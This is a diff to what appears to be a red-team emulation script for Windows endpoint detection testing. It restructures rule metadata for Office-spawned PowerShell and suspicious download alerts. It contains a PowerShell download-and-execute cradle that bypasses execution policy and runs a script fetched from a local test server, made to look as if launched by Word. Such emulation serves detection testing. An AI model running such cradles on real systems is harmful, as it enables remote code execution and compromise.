@@ -8,22 +8,21 @@ import time
 
 from . import common
 
-PLATFORMS = ["windows"]
-TRIGGERED_RULES = {
-    "SIEM": [],
-    "ENDPOINT": [
+
+RtaMetadata(
+    uuid="20b96aa7-609e-473f-ac35-5ac19d10f9a5",
+    platforms=["windows"],
+    endpoint=[
         {
             "rule_name": "PowerShell Obfuscation Spawned via Microsoft Office",
             "rule_id": "93ef8a09-0f8d-4aa1-b0fb-47d5d5b40cf2",
         },
-        {
-            "rule_name": "Suspicious PowerShell Downloads",
-            "rule_id": "7200673e-588c-45d5-be48-bc5c7a908d6b",
-        },
+        {"rule_name": "Suspicious PowerShell Downloads", "rule_id": "7200673e-588c-45d5-be48-bc5c7a908d6b"},
     ],
-}
-TECHNIQUES = ["T1566", "T1059"]
-RTA_ID = "20b96aa7-609e-473f-ac35-5ac19d10f9a5"
+    siem=[],
+    techniques=["T1566", "T1059"],
+)
+
 EXE_FILE = common.get_path("bin", "renamed.exe")
 
 
@@ -32,9 +31,7 @@ def main():
     server, ip, port = common.serve_web()
     url = "http://{}:{}/bad.ps1".format(ip, port)
 
-    cmd = "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(
-        url
-    )
+    cmd = "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(url)
 
     # Emulate Word
     user_app = "winword.exe"
